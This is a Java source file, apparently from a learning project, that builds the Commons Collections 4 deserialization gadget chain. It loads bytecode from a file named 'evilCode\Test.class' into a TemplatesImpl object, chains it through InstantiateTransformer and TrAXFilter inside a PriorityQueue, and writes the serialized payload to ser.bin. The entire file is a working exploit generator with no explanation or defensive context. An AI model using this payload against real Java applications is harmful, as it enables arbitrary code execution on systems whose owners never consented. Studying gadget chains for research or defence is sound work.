package org.CC.CC4;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CC4Test {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        Class tc = templates.getClass();
        Field nameField = tc.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates,"aaa");
        Field declaredField = tc.getDeclaredField("_bytecodes");
        declaredField.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("D:\\evilCode\\Test.class"));
        byte[][] codes = {code};
        declaredField.set(templates,codes);

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates}),
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(new ConstantTransformer(1));
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
        priorityQueue.add(new Integer(1));
        priorityQueue.add(new Integer(2));
        Field iTransformersField = chainedTransformer.getClass().getDeclaredField("iTransformers");
        iTransformersField.setAccessible(true);
        iTransformersField.set(chainedTransformer,transformers);
        serialize(priorityQueue);
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
}
